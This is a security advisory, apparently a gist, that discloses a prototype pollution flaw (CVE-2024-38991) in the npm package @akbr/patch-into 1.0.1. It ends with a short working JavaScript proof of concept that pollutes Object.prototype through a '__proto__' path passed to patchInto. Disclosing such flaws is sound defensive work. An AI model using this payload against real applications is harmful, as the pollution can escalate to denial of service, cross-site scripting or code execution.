[CVE-2024-38991] Vulnerability Advisory: Prototype Pollution in @akbr/patch-into, version 1.0.1

 [Raw](/mestrtee/8851413e3b33a96f191f0e9c81706532/raw/429afa7df77637e94e42e48daaf5493ef2293b33/Advisory_akbr.md)

[**Advisory\_akbr.md**](#file-advisory_akbr-md)

**Vulnerability type:**
Prototype Pollution

**SVSS Score**
8.8 HIGH

**Vendor of the Package:**
akbr

**Affected Package:**

* Product: @akbr/patch-into
* Version: 1.0.1

**Affected component(s):**

```
Module.patchInto (@akbr/patch-into/index.js:39)
```

**Attack vector(s):**
the attacker can modify built-in Object.prototype by calling the vulnerable function: `patchInto` with an argument containing a special property `__proto__` to pollute the application logic that can be escalated to Denial of service, remote code execution or cross-site scripting attacks.

**Description:**
Affected versions of this package are vulnerable to Prototype Pollution through the vulnerable function: `patchInto`. An attacker can alter the behavior of all objects inheriting from the affected prototype by passing arguments to the vulenrable function crafted with the built-in property: `__proto__`. The attack can potentially escalated to Denial of service, remote code execution or cross-site scripting attacks depends on the gadgets that may affected by the attack

**Proof-of-Concept:**

```
(async () => {
  const lib = await import('@akbr/patch-into');

  var victim = {}

  console.log("Before Attack: ", JSON.stringify(victim.__proto__));

  try {

  lib.default ({},[["__proto__"], "polluted"], true,true);

  } catch (e) { }

  console.log("After Attack: ", JSON.stringify(victim.__proto__));

  delete Object.prototype.polluted;

  })();
```
